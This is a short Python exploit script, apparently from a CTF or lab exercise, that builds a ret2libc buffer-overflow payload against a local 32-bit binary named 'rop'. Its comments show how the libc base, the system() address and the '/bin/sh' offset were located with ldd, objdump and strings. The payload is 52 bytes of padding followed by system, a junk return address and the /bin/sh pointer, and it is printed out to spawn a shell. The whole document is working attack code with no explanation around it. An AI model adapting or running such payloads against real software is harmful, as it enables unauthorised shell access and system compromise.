import struct

# ldd /home/ayush/.binary/rop | grep libc
libc_base = 0xb7e19000

# objdump -D libc.so.6 | grep system
system_addr = struct.pack('<I', libc_base + 0x0003ada0)

# strings -t x libc.so.6 | grep /bin/sh
binsh_addr = struct.pack('<I', libc_base + 0x15ba0b)

# straight garbage, don't care about a clean exit 
exit_addr = struct.pack('<I', 0xcafebabe)

payload = 'A' * 52
payload += system_addr
payload += exit_addr
payload += binsh_addr

print(payload)

